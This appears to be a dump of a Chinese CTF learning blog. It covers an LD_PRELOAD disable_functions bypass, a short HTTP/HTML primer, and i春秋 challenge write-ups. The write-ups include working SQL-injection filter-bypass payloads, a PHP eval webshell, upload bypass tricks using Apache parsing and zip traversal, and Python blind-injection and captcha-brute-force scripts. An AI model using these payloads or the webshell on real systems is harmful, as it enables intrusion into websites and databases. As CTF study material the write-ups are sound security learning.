<h3 id="使用antsword插件进行绕过"><a href="#使用antsword插件进行绕过" class="headerlink" title="使用antsword插件进行绕过"></a>使用antsword插件进行绕过</h3><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210207161515.png" alt="img" style="zoom:67%;">
接下来会在目录下生成一个php文件，直接再用蚁剑访问连接，密码依旧是之前那个

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210207161657.png" alt="img" style="zoom: 50%;">
接下来就可以发现flag在根目录下了

<h3 id="了解原理"><a href="#了解原理" class="headerlink" title="了解原理"></a>了解原理</h3><p>其实感觉用插件不明不白的，所以决定要深入学习一下</p>
<h4 id="原因："><a href="#原因：" class="headerlink" title="原因："></a>原因：</h4><p>为什么会使用不了系统命令呢？<br><strong>disable_functions</strong>开关在php.ini中可以关闭一些危险的功能，如系统、执行等</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210207163003.png" alt="img" style="zoom:67%;">

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210207163029.png" alt="img" style="zoom:67%;">
因为在这个disable_functions这里禁用了很多函数。　
**open_basedir**
网站内目录与目录之间是可以访问的，在某些特定情况下这样是不安全的，如果目录间网址权限被黑客利用很可能造成数据流失，在这里我们可以通过PHPopen_basedir来实现网站间目录隔离配置，从而提高网站安全。
注：网站间隔离用“：”号分割。
注：没有被包含的网站不可访问。

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210207163338.png" alt="img" style="zoom:67%;">

<p>PS：这里我之前想说尝试用文件包含漏洞看看能不能访问根目录的内容，但是因为有这个限制在，所以不行<br>所以接下来我们需要绕过这两个东西</p>
<h4 id="绕过思路"><a href="#绕过思路" class="headerlink" title="绕过思路"></a>绕过思路</h4><p>第一种，攻击后端组件，寻找存在命令注入的、web 应用常用的后端组件，如，ImageMagick 的魔图漏洞、bash 的破壳漏洞；<br>第二种，寻找未禁用的漏网函数，常见的执行命令的函数有 system()、exec()、shell_exec()、passthru()，偏僻的 popen()、proc_open()、pcntl_exec()，逐一尝试，或许有漏网之鱼；<br>第三种，mod_cgi 模式，尝试修改 .htaccess，调整请求访问路由，绕过 php.ini 中的任何限制；<br>第四种，利用环境变量 LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果。<br>参考:<a href="https://www.freebuf.com/articles/web/192052.html">https://www.freebuf.com/articles/web/192052.html</a></p>
<p>但今天我们就直接看一下第四种方法</p>
<h4 id="基础知识学习"><a href="#基础知识学习" class="headerlink" title="基础知识学习"></a>基础知识学习</h4><h5 id="linux动态库（so共享对象库），静态库"><a href="#linux动态库（so共享对象库），静态库" class="headerlink" title="linux动态库（so共享对象库），静态库"></a>linux动态库（so共享对象库），静态库</h5><p>一个“程序函数库”简单的说就是一个文件包含了一些编译好的代码和数据，这些编译好的代码和数据可以在事后供其他的程序使用。程序函数库可以使整个程序更加模块化，更容易重新编译，而且更方便升级。  </p>
<p>程序函数库可分为3种类型：静态函数库（static libraries）、共享函数库（shared libraries）、动态加载函数库（dynamically loaded libraries）<strong>动态函数库同*共享函数库是一个东西（在linux上叫共享对象库， 文件后缀是.so ，windows上叫动态加载函数库， ****文件后缀是****.dll）**</strong></p>
<p>今天我们需要学习的就是动态函数库,因为需要创建.so文件</p>
<h5 id="共享函数库："><a href="#共享函数库：" class="headerlink" title="共享函数库："></a>共享函数库：</h5><p>**定义:**共享函数库中的函数是在当一个可执行程序在启动的时候被加载。如果一个共享函数库正常安装，所有的程序在重新运行的时候都可以自动加载最新的函数库中的函数。对于Linux系统还有更多可以实现的功能：<br>    1、升级了函数库但是仍然允许程序使用老版本的函数库。<br>    2、当执行某个特定程序的时候可以覆盖某个特定的库或者库中指定的函数。<br>    3、可以在库函数被使用的过程中修改这些函数库。</p>
<h5 id="PHP启动外部程序："><a href="#PHP启动外部程序：" class="headerlink" title="PHP启动外部程序："></a>PHP启动外部程序：</h5><p>PHP启动外部程序有两种，常见的就是使用cat，system等指令，但是在这里是用不了的<br><a href="https://segmentfault.com/a/1190000008941850">https://segmentfault.com/a/1190000008941850</a><br>还有一种就是通过PHP解释器：这里直接摘抄大佬的思路：比如，php 函数 goForward() 实现“前进”的功能，php 函数 goForward() 又由组成 php 解释器的 C 语言模块之一的 move.c 实现，C 模块 move.c 内部又通过调用外部程序 go.bin 实现，那么，我的 php 脚本中调用了函数 goForward()，势必启动外部程序 go.bin。</p>
<h5 id="LD-PRELOAD环境变量："><a href="#LD-PRELOAD环境变量：" class="headerlink" title="LD_PRELOAD环境变量："></a>LD_PRELOAD环境变量：</h5><p>LD_PRELOAD是Linux系统的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。</p>
<h5 id="LD-PRELOAD实现思路（思路重点）"><a href="#LD-PRELOAD实现思路（思路重点）" class="headerlink" title="LD_PRELOAD实现思路（思路重点）"></a>LD_PRELOAD实现思路（思路重点）</h5><p>在看完大佬的思路解析后，我来复现一下，首先我们知道LD_PRELOAD可以允许我们定义在程序运行前优先加载的动态链接库，此时我们设这个库为e_evil.so，在这个库中我们可以加入可以执行的恶意代码，注意此时这个库中的代码是不受disable_functions限制的，因为他不是这个系统当中，是我们后来定义的，那么有人会问，为啥执行的是我们定义的这个库里的系统函数，而不是原本存在的？这里就是因为我们一开始说的因为它的优先级比较高，那么如何使得我们定义的这个系统之外的函数被加载呢？那就需要我们通过web打开新进程。</p>
<h2 id="插件使用条件"><a href="#插件使用条件" class="headerlink" title="插件使用条件"></a>插件使用条件</h2><p>成功使用此绕过插件的三个必要条件是：</p>
<p>1.mail()函数和error_log()函数所调用的sendmail已安装<br>2.不限制 /usr/sbin/sendmail 的执行<br>3.mail()函数和error_log()函数有一个未被禁用</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>在这里有个点，一开始我是直接大神的bypass工具集，在操作的时候发现怎么都没法输出，后来重新看了一下文章，他是使用mail()函数，但是在本题当中，mail函数是被禁用的，所以最终就失败了。<br>其实现在对于这个bypass的原理差不多已经清晰了，感觉这个思路确实很厉害，是以一种劫持的思想绕过disable_function的拦截。</p>
<p>参考大神链接：<a href="https://www.freebuf.com/articles/web/192052.html">https://www.freebuf.com/articles/web/192052.html</a><br>antsword插件运行原理细节：<a href="https://www.anquanke.com/post/id/195686">https://www.anquanke.com/post/id/195686</a></p>
]]></content>
  </entry>
  <entry>
    <title>http原理</title>
    <url>/2020/12/06/http%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>HTTP协议是Hyper Text Transfer Protocol（超文本传输协议）的缩写,是用于从万维网（WWW:World Wide Web ）服务器传输超文本到本地浏览器的传送协议。。</p>
<p>HTTP是一个基于TCP/IP通信协议来传递数据（HTML 文件, 图片文件, 查询结果等）。                                     <a id="more"></a></p>
<h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><p>HTTP协议工作于客户端-服务端架构上。浏览器作为HTTP客户端通过URL向HTTP服务端即WEB服务器发送所有请求。<br>web服务器有：Apache服务器，IIS服务器等<br>web服务器根据接收到的请求后，向客户端发送响应信息。<br>HTTP默认端口号是80，也可以更改</p>
<h2 id="html语法："><a href="#html语法：" class="headerlink" title="html语法："></a>html语法：</h2><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210121194030.png" alt="img" style="zoom:67%;">

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210121195442.png" alt="img" style="zoom:67%;">





<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210122091555.png" alt="img" style="zoom:67%;">

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210122092139.png" alt="img" style="zoom:67%;">

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210122092231.png" alt="img" style="zoom:80%;">
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210122092337.png" alt="img" style="zoom:67%;">
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210122092450.png" alt="img" style="zoom:67%;">
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210122092451.png" alt="img" style="zoom:67%;">
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210122093840.png" alt="img" style="zoom:80%;">

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210122093841.png" alt="img" style="zoom:67%;">

<h2 id="HTML和PHP"><a href="#HTML和PHP" class="headerlink" title="HTML和PHP"></a>HTML和PHP</h2><p>html是用来做网页的表现层的，也就是你所看到的如字体，链接，图片等<br>PHP是用来处理逻辑层的，也就是你要网页提供什么功能，完成什么动作。</p>
<p><strong>PHP代码是嵌入html中的</strong><br>他们之间的关系大概可以这样概括<br><em>HTML展示内容<br>PHP动态修改输出HTML展示内容<br>CSS美化页面<br>JS让页面动起来。提高浏览体验。</em></p>
]]></content>
      <tags>
        <tag>html</tag>
      </tags>
  </entry>
  <entry>
    <title>i春秋1</title>
    <url>/2021/02/08/i%E6%98%A5%E7%A7%8B1/</url>
    <content><![CDATA[<p>最近刷bugku的题，刷到最后一关实在有点太磨人了，来i春秋换换心情吧。。</p>
<h2 id="文件上传："><a href="#文件上传：" class="headerlink" title="文件上传："></a>文件上传：</h2><p>今天做了i春秋的一题文件上传题目，收获还蛮多的，主要是复习了一下之前文件上传的知识点，还学到了新的知识:                   <a id="more"></a></p>
<h3 id="代码分析："><a href="#代码分析：" class="headerlink" title="代码分析："></a>代码分析：</h3><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210208182156.png" alt="img" style="zoom:67%;">

<p>这边对上传的文件后缀是使用了白名单检查的一个函数<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210208182313.png" alt="img" style="zoom:50%;"><br>在这里，我们发现，如果后缀是压缩文件zip的话，也是可以上传的，但是后续解压出来的文件要经过check_dir()的检查。<br>看到这个是白名单检查，并且在</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210208182858.png" alt="img" style="zoom:67%;">
这里的提示下，我们知道这个是apache服务器。

<h3 id="apache解析漏洞"><a href="#apache解析漏洞" class="headerlink" title="apache解析漏洞"></a>apache解析漏洞</h3><p><strong>在Apache1.x，2.x中Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。</strong></p>
<p>所以我们上传123.xxx.php.xxx只要这个xxx是不可识别的后缀，那么打开这个文件的时候，Apache就会将其解析为php文件。</p>
<p>更多参考:<a href="https://www.anquanke.com/post/id/219107#h3-3">https://www.anquanke.com/post/id/219107#h3-3</a></p>
<h3 id="PCLzip文件解压存在目录穿越漏洞"><a href="#PCLzip文件解压存在目录穿越漏洞" class="headerlink" title="PCLzip文件解压存在目录穿越漏洞"></a>PCLzip文件解压存在目录穿越漏洞</h3><p>当我们在压缩文件内的文件名设置为../../123.php当这个文件名和文件路径拼接以后就会变成/upload/xxxxxx/../../123.php 那么这时，访问该文件就只需要访问上两级的目录即可</p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>我们构造一个压缩文件，压缩文件里面放有一个jpg文件，一个由010editor更改过后缀的php文件<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210208185702.png" alt="img"><br>然后将其上传，这个时候直接在url中访问即可</p>
<h3 id="出现的问题"><a href="#出现的问题" class="headerlink" title="出现的问题"></a>出现的问题</h3><p>我上传的这个文件怎么都找不到了，我就有点无语，看了一下源码，他在每次上传加压文件后，都会再经过一个check_dir()函数的检查，而且还是递归检查，那其实上面这个方法就不可行了。后来我在盲试，让文件后缀=php.jpg上传以后，打开，发现就是flag了？？？？？？？？？？？？<br>后来就在猜想，难不成是因为有.htaccess文件，使得上传成功并且存在的文件内容含有php 就可以解析为php？，那这题也太搞了吧。</p>
<p>反正这题就先告一段落了，想了想就这样过得不明不白的实在不行，决心再回来好好梳理一下：顺便整理一下文件上传的漏洞</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $file = $_FILES[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!$file)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;请勿上传空文件&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$name = $file[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">$dir = <span class="string">&#x27;upload/&#x27;</span>;</span><br><span class="line">$ext = strtolower(substr(strrchr($name, <span class="string">&#x27;.&#x27;</span>), <span class="number">1</span>));<span class="comment">//就是用来检验name还有没有后缀</span></span><br><span class="line">$path = $dir.$name;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_dir</span>(<span class="params">$dir</span>)</span>&#123;</span><br><span class="line">    $handle = opendir($dir);<span class="comment">//针对的是upload的下级目录</span></span><br><span class="line">    <span class="keyword">while</span>(($f = readdir($handle)) !== <span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!in_array($f, <span class="keyword">array</span>(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;..&#x27;</span>)))&#123;</span><br><span class="line">            <span class="keyword">if</span>(is_dir($dir.$f))&#123;</span><br><span class="line">                check_dir($dir.$f.<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">             &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                $ext = strtolower(substr(strrchr($f, <span class="string">&#x27;.&#x27;</span>), <span class="number">1</span>));</span><br><span class="line">                <span class="keyword">if</span>(!in_array($ext, <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;png&#x27;</span>)))&#123;<span class="comment">//白名单检查后缀说明这个是想利用解析漏洞是不行滴</span></span><br><span class="line">                    unlink($dir.$f);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!is_dir($dir))&#123;</span><br><span class="line">    mkdir($dir);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$temp_dir = $dir.md5(time(). rand(<span class="number">1000</span>,<span class="number">9999</span>));</span><br><span class="line"><span class="keyword">if</span>(!is_dir($temp_dir))&#123;<span class="comment">//创建临时目录</span></span><br><span class="line">    mkdir($temp_dir);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(in_array($ext, <span class="keyword">array</span>(<span class="string">&#x27;zip&#x27;</span>, <span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;png&#x27;</span>)))&#123;</span><br><span class="line">    <span class="keyword">if</span>($ext == <span class="string">&#x27;zip&#x27;</span>)&#123;</span><br><span class="line">        $archive = <span class="keyword">new</span> PclZip($file[<span class="string">&#x27;tmp_name&#x27;</span>]);<span class="comment">//使用pclzip的方式进行解压</span></span><br><span class="line">        <span class="keyword">foreach</span>($archive-&gt;listContent() <span class="keyword">as</span> $value)&#123;</span><br><span class="line">            $filename = $value[<span class="string">&quot;filename&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\.php$/&#x27;</span>, $filename))&#123;<span class="comment">//正则匹配是否存在php文件，有的话就直接不往下检查了，黑名单检查，可以</span></span><br><span class="line">                 <span class="keyword">exit</span>(<span class="string">&quot;压缩包内不允许含有php文件!&quot;</span>);  <span class="comment">//利用解析漏洞</span></span><br><span class="line">             &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($archive-&gt;extract(PCLZIP_OPT_PATH, $temp_dir, PCLZIP_OPT_REPLACE_NEWER) == <span class="number">0</span>) &#123;</span><br><span class="line">            check_dir($dir);</span><br><span class="line">               <span class="keyword">exit</span>(<span class="string">&quot;解压失败&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        check_dir($dir);</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;上传成功!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        move_uploaded_file($file[<span class="string">&#x27;tmp_name&#x27;</span>], $temp_dir.<span class="string">&#x27;/&#x27;</span>.$file[<span class="string">&#x27;name&#x27;</span>]);<span class="comment">//直接拼接文件名是造成任意文件上传漏洞</span></span><br><span class="line">        check_dir($dir);                                                 <span class="comment">//但这里不行</span></span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;上传成功!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&#x27;仅允许上传zip、jpg、gif、png文件!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看完源码，发现原来的思路是没有问题的呀，构造穿越目录文件名，当文件被解压后，文件此时已经穿越到上级目录了，而check_dir()针对检查的是upload/下的目录文件，而用apache的解析漏洞目的是逃过那个黑名单检查，感觉这个题目可能哪里出了问题吧</p>
<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>先用burpsuit跑了一下过滤了啥，发现过滤了select 和order，如何绕过呢？这里新学了一种&lt;&gt;连接符<br>payload:<br>?id=1 ord&lt;&gt;er by 3<br>?id=1 union sel&lt;&gt;ect 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()<br>?id=1 union sel&lt;&gt;ect 1,group_concat(column_name),3 from information_schema.columns where table_name=’info’<br>?id=1 union sel&lt;&gt;ect 1,flAg_T5ZNdrm,3 from info</p>
<h2 id="UPLOAD"><a href="#UPLOAD" class="headerlink" title="UPLOAD"></a>UPLOAD</h2><p>直接上传一句话木马，发现连接不了，猜测有过滤内容，于是将一句话木马分解输入， 发现过滤了&lt;?和php，想到之前看到过的另一种写马的方法:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;pHp&quot;&gt;@eval($_POST[&#39;cmd&#39;])&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>即可连接，然后就可以找到flag了</p>
<h2 id="文件包含（include）"><a href="#文件包含（include）" class="headerlink" title="文件包含（include）"></a>文件包含（include）</h2><p>这题是文件包含，因为是request请求path，所以直接输路径，试了一下flag.php 发现没有收获，在下面var/www/html等路径都找了一下发现也没有，想了一下，之前文件包含漏洞有结合过php://input封装协议</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210209183248.png" alt="img" style="zoom:67%;">

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210209183253.png" alt="img" style="zoom:67%;">
后来回想了一下，为啥这题可以用这个php://input封装协议？:
**allow_url_include = On(允许引用URL文件)**因为这个是打开的，所以其实以后看到这个配置，就要思考一下是否需要使用这个封装协议来解题了
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210209184611.png" alt="img" style="zoom:67%;">

<h2 id="Do-you-know-upload？"><a href="#Do-you-know-upload？" class="headerlink" title="Do you know upload？"></a>Do you know upload？</h2><p>这一题依旧是文件上传题，先看一下是黑名单还是白名单过滤，上传了一个txt文件，发现还是说文件类型不允许，所以推测是白名单</p>
<p>上传jpg文件，然后修改后缀为php即可绕过上传</p>
<p>上传以后看了一会都没发现flag，发现数据库的账号密码，可能是要我们看数据库吧，所以在用蚁剑连接数据库，即可获得flag，<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210209191849.png" alt="img" style="zoom:67%;"></p>
<p>flag{04add780-f807-45af-aea6-99ae0d3d2e09}</p>
<h2 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h2><p><strong>第一届“百度杯”信息安全攻防总决赛 线上选拔赛</strong><br>他让我们速度要快，然后查看到信息，让我们post找到的东西</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210209195057.png" alt="img" style="zoom:67%;">

<p>看了一下其他地方，发现也没啥有用的信息了，然后就抓包，看到回应的报文中有flag，但是每次收到的都不一样，就想到之前在bugku里面做过一题类似的，所以就用了之前用过的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://3013bae61dcc4556a1e1e2574cdd037795ba5817823d4218.changame.ichunqiu.com/&#x27;</span></span><br><span class="line">r = requests.session()</span><br><span class="line">headers = r.get(url).headers</span><br><span class="line">mid = base64.b64decode(headers[<span class="string">&#x27;flag&#x27;</span>])</span><br><span class="line">print(mid)</span><br><span class="line">mid = mid.decode()  <span class="comment"># 因为base64解密一次是byte类型，包含了中文字符，所以还需要解码一次</span></span><br><span class="line">print(mid)</span><br><span class="line">flag = base64.b64decode(mid.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">print(flag)</span><br><span class="line">data = &#123;<span class="string">&#x27;ichunqiu&#x27;</span>: flag&#125;</span><br><span class="line">print(r.post(url, data).text)</span><br></pre></td></tr></table></figure>

<p>果然跑出来了<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210209194958.png" alt="img" style="zoom:67%;"></p>
<p>他说path=这个东西我一开始以为是被加密了，一直去解密都没找到结果，然后还是看了wp，发现直接把它加在路径上就可以了，连接后登陆到页面，看到登录框，一开始以为是SQL注入，尝试了一会发现都没啥收获，没办法 再去看了一下wp 说是svp源码泄露？？？这我就懵了，不懂在哪里看出来的，然后去下面翻评论，看到说是经验，于是去搜索了一波，大概有几种源码泄露，决定整理一波。<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210210162047.png" alt="img" style="zoom:67%;"></p>
<p>接下来拿去MD5编码一下可得到<br>8638d5263ab0d3face193725c23ce095<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210210162505.png" alt="img"></p>
<p>这里说是需要captcha的MD5加密后的前六位是365268，这里编写一个脚本:<br>这个是参考脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">s</span>)</span></span><br><span class="line"><span class="function">    <span class="title">return</span> <span class="title">hashlib</span>.<span class="title">md5</span>(<span class="params">str(<span class="params">s</span>).encode(<span class="params"><span class="string">&#x27;utf-8&#x27;</span></span>)</span>).<span class="title">hexdigest</span>()</span></span><br><span class="line"><span class="function"><span class="title">def</span> <span class="title">main</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">999999999</span>):</span><br><span class="line">        <span class="keyword">if</span> md5(i)[<span class="number">0</span>:<span class="number">6</span>] == str(s):</span><br><span class="line">            print(i)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__mian__&#x27;</span>:<span class="comment">#这里是相当于一个入口，具体可以谷歌</span></span><br><span class="line">    mian(<span class="string">&quot;******&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>自己编写:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">s=<span class="string">&#x27;*****&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9999999</span>)://如果跑不出来 就把数字范围再加大点</span><br><span class="line">    i=a</span><br><span class="line">    i=hashlib.md5(str(i).encode(<span class="string">&#x27;uft-8&#x27;</span>)).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> i[<span class="number">0</span>:<span class="number">6</span>] == str(s):</span><br><span class="line">        print(a)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>


<p>这里密码随意都可以</p>
<p>爆破出验证码以后登录即可看到这个框<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210210172358.png" alt="img" style="zoom:67%;"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">The 7815696ecbf1c96e6894b779456d330e.php:)Welcome 8638d5263ab0d3face193725c23ce095!</span><br></pre></td></tr></table></figure>

<p>提示说这个MD5解码后的asd.php让我们打开看看后来发现 根本不需要解码–感觉对于识别是何种加密方式的能力还不熟悉，全凭感觉，还是要再去学习一下<br>接下来就到了文件上传</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210210183449.png" alt="img" style="zoom:67%;">

<p>上传txt文件也不可以上传，上传php文件不行，<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210210183842.png" alt="img" style="zoom:67%;"><br>所以这里推测一下应该是白名单过滤,但是应该还有检查其他参数吧，burpsuit抓包的时候改一下MIME参数试试能不能绕过<br>那就首先把常用的几个后缀都试试好了:大小写、pht、phtml、php3、php5，最后发现pht可以得到flag</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210210184252.png" alt="img" style="zoom:67%;">]]></content>
  </entry>
  <entry>
    <title>i春秋2</title>
    <url>/2021/02/10/i%E6%98%A5%E7%A7%8B2/</url>
    <content><![CDATA[<h1 id="SQL注入——1"><a href="#SQL注入——1" class="headerlink" title="SQL注入——1"></a>SQL注入——1</h1><p>在更换?id=3时，它会让你叠加输入tips，此时你就可以看到你输入的sql语句，算是一个帮助吧，然后这关没啥过滤的好像，直接union select联合注入就可以了 </p>
<a id="more"></a>

<h1 id="SQL注入——2"><a href="#SQL注入——2" class="headerlink" title="SQL注入——2"></a>SQL注入——2</h1><p>admin’and 1=1#——账号或密码错误  ——u8bef<br>admin’and 1=2#——账号不存在  —— u5728<br>判断需要盲注：<br>写脚本由于不知道列名，所以就不能直接爆破密码，幸好过滤的不是很多，反正substr没被过滤，就开始盲注吧，过滤了select，但是可以用双写绕过</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://eci-2ze42dfnzqpolzrkhy2v.cloudeci1.ichunqiu.com/login.php&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line">headers = s.get(url).headers</span><br><span class="line">password = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&#x27;0123456789qwertyuiopasdfghjklzxcvbnm!?._+=`~&amp;*&#123;&#125;[]&#x27;</span>:</span><br><span class="line">        payload =<span class="string">f&quot;admin&#x27;-(substr(database(),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;j&#125;</span>&#x27;)-&#x27;#&quot;</span></span><br><span class="line">        print(payload)</span><br><span class="line">        data = &#123;<span class="string">&#x27;name&#x27;</span>: payload,<span class="string">&#x27;pass&#x27;</span>: <span class="string">&#x27;sky&#x27;</span>&#125;</span><br><span class="line">        <span class="comment"># print(s.post(url,data=data).text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;u5728&#x27;</span> <span class="keyword">in</span> s.post(url=url,data=data).text:</span><br><span class="line">            <span class="comment">#print(s.post(url,data=data).text)</span></span><br><span class="line">            password += j</span><br><span class="line">            print(password)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210211153150.png" alt="img" style="zoom:67%;">
得到数据库名字

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://eci-2ze42dfnzqpolzrkhy2v.cloudeci1.ichunqiu.com/login.php&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line">headers = s.get(url).headers</span><br><span class="line">password = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&#x27;0123456789qwertyuiopasdfghjklzxcvbnm!?._+=`~&amp;*&#123;&#125;[],，&#x27;</span>:</span><br><span class="line">        payload =<span class="string">f&quot;admin&#x27;-(substr((selselectect table_name from information_schema.tables where table_schema=&#x27;note&#x27; limit 0,1),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;j&#125;</span>&#x27;)-&#x27;#&quot;</span></span><br><span class="line">        print(payload)</span><br><span class="line">        data = &#123;<span class="string">&#x27;name&#x27;</span>: payload,<span class="string">&#x27;pass&#x27;</span>: <span class="string">&#x27;sky&#x27;</span>&#125;</span><br><span class="line">        <span class="comment"># print(s.post(url,data=data).text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;u5728&#x27;</span> <span class="keyword">in</span> s.post(url=url,data=data).text:</span><br><span class="line">            <span class="comment">#print(s.post(url,data=data).text)</span></span><br><span class="line">            password += j</span><br><span class="line">            print(password)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

